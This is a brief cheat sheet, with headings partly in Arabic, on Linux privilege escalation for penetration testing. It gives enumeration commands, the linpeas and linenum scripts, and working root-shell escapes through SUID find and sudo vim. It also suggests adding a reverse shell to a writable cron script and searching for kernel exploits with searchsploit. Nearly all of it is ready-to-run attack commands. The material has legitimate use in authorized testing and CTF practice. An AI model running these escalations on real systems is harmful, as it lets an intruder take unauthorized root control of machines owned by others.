# Linux Privilege Escalation

## Enumeration سريع
```bash
id; uname -a; cat /etc/os-release
sudo -l
find / -perm -4000 -type f 2>/dev/null        # SUID binaries
crontab -l ; cat /etc/crontab
```

## أدوات أتمتة
```bash
./linpeas.sh
./linenum.sh
```

## SUID abuse (GTFOBins)
```bash
# مثال: لو find فيها SUID
find . -exec /bin/sh -p \; -quit
```

## Sudo misconfig
```bash
sudo -l
# لو سمح بـ: (ALL) NOPASSWD: /usr/bin/vim
sudo vim -c ':!/bin/sh'
```

## Cron jobs قابلة للكتابة
```bash
ls -la /etc/cron.d/
# لو السكريبت المجدول قابل للكتابة -> عدّله يضيف reverse shell
```

## Kernel exploits
```bash
uname -r
searchsploit linux kernel <version>
```
